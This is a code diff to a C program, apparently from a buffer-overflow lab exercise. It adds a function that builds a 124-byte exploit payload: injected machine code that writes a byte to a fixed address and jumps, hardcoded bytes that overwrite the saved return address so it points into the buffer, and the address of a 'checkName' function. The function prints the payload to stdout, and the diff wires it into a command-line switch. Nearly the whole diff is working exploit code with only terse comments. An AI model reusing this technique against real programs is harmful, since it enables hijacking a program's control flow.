@@ -104,6 +104,42 @@ void fnCaseB(){
 
 }
 
+
+void fnCaseA(){
+	//////////////// Assembly code /////////////
+	//movb $0x41, 0x0600da4 //   0xc6 0x04 0x25 0xa4 0x0d 0x60 0x00 0x42
+	//jmp 0x400813 (absolute)  Need to subtract. So 1's complement after subtracting from 0x0600dee.
+	////////////////////////////////////////////
+
+	char inp[124] = "Arun\0\0""\xc6\x04\x25\xa4\x0d\x60\x00\x41""\xe9\x20\xfa\xdf\xff";
+	//Over writing the rip to return to buffer which contains above assembly code.
+	inp[104] = (char) 0xe6;
+	inp[105] = (char) 0x0d;
+	inp[106] = (char) 0x60;
+	inp[107] = (char) 0x00;
+	// Writing the address of checkName
+	inp[64] = (char) 0x69;
+	inp[65] = (char) 0x08;
+	inp[66] = (char) 0x40;
+	inp[67] = (char) 0x00;
+	
+	
+	//Over writing the rip to return to buffer which contains above assembly code.
+	inp[120] = (char) 0xe6;
+	inp[121] = (char) 0x0d;
+	inp[122] = (char) 0x60;
+	inp[123] = (char) 0x00;
+	// Writing the address of checkName
+	inp[80] = (char) 0x69;
+	inp[81] = (char) 0x08;
+	inp[82] = (char) 0x40;
+	inp[83] = (char) 0x00;
+
+	write(1,inp,124);
+	fflush(stdout);
+	//inp[69] = '\0';
+}
+
 void fnCaseS(){
 
 	char* inp = malloc(sizeof(char) * 108);
@@ -139,6 +175,8 @@ int main(int argc, char**argv)
 	}
 	switch(argv[1][0])
 	{
+		case 'a': fnCaseA();
+			 break;
 		case 'b': fnCaseB();
 			 break;
 		case 'd': fnCaseD();
